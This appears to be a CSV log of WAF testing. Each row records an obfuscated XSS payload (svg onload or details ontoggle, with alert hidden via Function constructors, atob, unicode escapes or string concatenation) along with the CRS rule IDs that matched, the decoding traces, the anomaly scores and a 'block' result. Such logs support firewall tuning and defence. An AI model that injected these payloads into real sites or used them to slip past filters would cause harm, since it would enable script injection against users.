2325,"<svg onload=""Reflect.apply(Function,null,['return '+atob('YWxlcnQ=')+'(1)'])()"">",0,1,block,4,"941100,941120,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826871266.334878
2338,"<svg onload=""(new Function('return al'+'ert(1)'))()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,13v216,53 || o14,13v216,53t:urlDecodeUni || v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,53t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826874132.269633
2345,"<svg onload=""globalThis.Function('return al'+'ert(1)')()"">",0,1,block,4,"941100,941120,941160,949110","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826875751.512935
2352,"<svg onload=""window['Function']['prototype']['constructor']['call']({},`ret\u0075rn ale\u0072t(1)`)()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,82v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,103t:urlDecodeUni,t:compressWhitespace || ",25,177826877331.837916
2353,"<svg onload=""Reflect.apply([]['filter']['constructor'],null,['ale'+'rt(1)'])()"">",0,1,block,4,"941100,941120,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826877612.344619
2354,"<svg onload=""(function(){return this})()['Function']('ale'+'rt(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,56v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,71 || o14,11v217,71t:urlDecodeUni || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826877856.207620
2355,"<svg onload=""Reflect['construct'](Function,['ale'+'rt(1)'])()"">",0,1,block,5,"933210,941100,941120,941160,949110","o20,41v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826878061.673736
2405,"<svg onload=""(false||Function)(''+atob('YWxlcnQoMSk='))()"">",0,1,block,4,"941100,941120,941160,949110","v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826889436.805354
2414,"<svg onload=""Function?.constructor('\u0061lert(1)')()"">",0,1,block,4,"941100,941120,941160,949110","v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826891410.791084
2419,"<svg onload=""(new (class{constructor(){eval('\u0061lert(1)')}})())"">",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o36,7v217,68 || o39,27v217,68 || o55,11v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || o39,5v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826892682.183075
2448,"<svg onload=""parent[atob('RnVuY3Rpb24=')]('ale'+'rt(9)')()"">",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782689922.970189
2457,"<svg onload=""(1,Function)('ale'+'rt(9)')()"">",0,1,block,4,"941100,941120,941160,949110","v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,44t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826901370.622462
2458,"<svg onload=""Reflect.construct(Function,['ale'+'rt(9)'])()"">",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826901510.027772
2461,"<svg onload=""(function(){return this}())['Fun'+'ction']('ale'+'rt(9)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,59v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,74 || o14,11v217,74t:urlDecodeUni || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826902268.969459
2479,"<svg onload=""(function(){})['constr'+'uctor']('ale'+'rt(1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o13,49v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,64 || o14,11v217,64t:urlDecodeUni || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177826906241.741581
2486,"<svg onload=""window['Function']('retur'+'n aler'+'t')()('1')""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,41v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,68t:urlDecodeUni,t:compressWhitespace || ",25,177826907733.207575
2488,"<svg onload=""this['co'+'nst'+'ruc'+'tor']['co'+'nst'+'ruc'+'tor']('return ale'+'rt')()(1)""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,72v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,28v217,97t:urlDecodeUni,t:compressWhitespace || ",25,17782690829.060136
2496,"<svg onload=""with(window)with(Function)with(constructor)apply(null,['return al'+'ert'])()(1)""></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o67,25v217,100t:urlDecode,t:replaceComments,t:compressWhitespace || v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o18,68v217,100t:urlDecodeUni,t:compressWhitespace || ",25,177826910049.104912
2519,"<svg onload=""(function(){})['constr\u0075ctor']['constr\u0075ctor'](atob('YWxlcnQoMSk='))()""></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o14,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782691521.808475
2525,"<svg onload=""self['Function'](self['atob']('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,52v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,71t:urlDecodeUni,t:compressWhitespace || ",25,177826916625.201890
2526,"<svg onload=""top['Function'](top['atob']('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,51v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,69t:urlDecodeUni,t:compressWhitespace || ",25,177826916851.162626
2528,"<details open ontoggle=""new Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,70 || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826917353.239355
2535,"<svg onload=""Function['constructor'](atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o21,47v217,70t:urlDecode,t:replaceComments,t:compressWhitespace || v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826919078.869996
2536,"<svg onload=""async function x(){return Function(atob('cmV0dXJuIGFsZXJ0KDEp'))()};x()"">",0,1,block,5,"933210,941100,941120,941160,949110","o29,55v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826919297.926754
2537,"<svg onload=""window['Function']['constructor'](atob('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o19,59v217,80t:urlDecode,t:replaceComments,t:compressWhitespace || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,18v217,80t:urlDecodeUni,t:compressWhitespace || ",25,177826919460.289942
2539,"<svg onload=""new window['Function'](window['atob']('cmV0dXJuIGFsZXJ0KDEp'))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o23,54v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o17,18v217,79t:urlDecodeUni,t:compressWhitespace || ",25,177826919993.547552
2563,"<svg onload=""setTimeout(Function['constructor']('al'+'ert(1)'),0)"">",0,1,block,5,"933210,941100,941120,941160,949110","o23,42v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826925418.192816
2578,"<svg onload=""setTimeout(parent['Function']('al'+'ert(1)'),0)"">",0,1,block,5,"933210,941100,941120,941160,949110","o23,37v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826928958.274165
2581,"<svg onload=""setTimeout(globalThis['Function']('al'+'ert(1)'),0)"">",0,1,block,5,"933210,941100,941120,941160,949110","o23,41v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826929651.409628
2584,"<svg onload=""queueMicrotask(Function('return al'+'ert(1)'))"">",0,1,block,4,"941100,941120,941160,949110","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826930323.906120
2585,"<svg onload=""Promise.resolve().then(Function('return al'+'ert(1)'))"">",0,1,block,4,"941100,941120,941160,949110","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826930655.992864
2589,"<svg onload=""(function(){}).constructor('return al'+'ert(1)')()"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o14,11v217,65 || o14,11v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826931594.496656
2595,"<svg onload=""isNaN[name='co'+'nstructor'][name]('return al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941160,949110","o41,30v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826932950.454750
2602,"<svg onload=""Function('ale'+'rt(1)')()""></svg>",0,1,block,6,"941100,941120,941160,942100,942100,949110","v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,46 || v216,46t:urlDecodeUni || ",25,177826934514.363875
2611,"<svg onload=""(function(){return this})()['al\u0065rt'](1)""></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,44v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,65 || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826936659.698526
2636,"<svg onload=""self['Function']('retu'+'rn ale'+'rt(9)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,39v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,58t:urlDecodeUni,t:compressWhitespace || ",25,177826942595.895102
2639,"<svg onload=""setTimeout(new Function('aler'+'t(9)'))"">",0,1,block,6,"934100,934100,941100,941120,941160,949110","o24,13v216,54 || o24,13v216,54t:urlDecodeUni || v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826943276.208826
2642,"<svg onload=""(function(){self['al\x65rt'](1)})()"">",0,1,block,6,"934100,941100,941120,941160,941370,949110","o14,11v216,50 || v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,16v216,50t:urlDecodeUni,t:compressWhitespace || ",25,17782694390.844885
2665,"<svg onload=""this.remove();Function('al'+'ert(1)')()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826949374.538808
2667,"<svg onload=""this.remove();with(window)Function('al'+'ert(1)')()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826949712.310309
2698,"<svg onload=""this.remove();(Function.prototype.constructor.call(null,atob('YWxlcnQoMSk=')))()"">",0,1,block,4,"941100,941120,941160,949110","v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782695687.923086
2703,"<svg onload=""this.remove();(Reflect.construct(function(){}.constructor,[atob('YWxlcnQoMSk=')]))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o46,11v217,99 || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826958013.293970
2708,"<svg onload=""this.remove();(async function(){}.constructor.constructor(atob('YWxlcnQoMSk=')))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o34,11v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826959139.741507
2709,"<svg onload=""this.remove();(function*(){}.constructor.constructor(atob('YWxlcnQoMSk=')))()"">",0,1,block,5,"932100,941100,941120,941160,949110","o26,10v217,92 || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826959469.759322
2710,"<svg onload=""this.remove();(Object.getPrototypeOf(function(){}).constructor(atob('YWxlcnQoMSk=')))()"">",0,1,block,5,"934100,941100,941120,941160,949110","o50,11v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826959659.254338
2711,"<svg onload=""this.remove();(window['Function'.split('').join('')](atob('YWxlcnQoMSk=')))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o27,63v217,92t:urlDecode,t:replaceComments,t:compressWhitespace || v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,37v217,92t:urlDecodeUni,t:compressWhitespace || ",25,177826959981.241714
2718,"<svg onload=""this.remove();(window.Function(atob('YWxlcnQoMSk=')))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826961442.509042
2723,"<svg onload=""this.remove();(new(window.Function.bind(null,unescape('%61%6C%65%72%74%28%31%29'))))()""></svg>",0,1,block,4,"941100,941120,941160,949110","v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826962679.910998
2725,"<svg onload=""this.remove();(new[self.Function][0](unescape('%61%6C%65%72%74%28%31%29')))()""></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o27,47v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782696311.382876
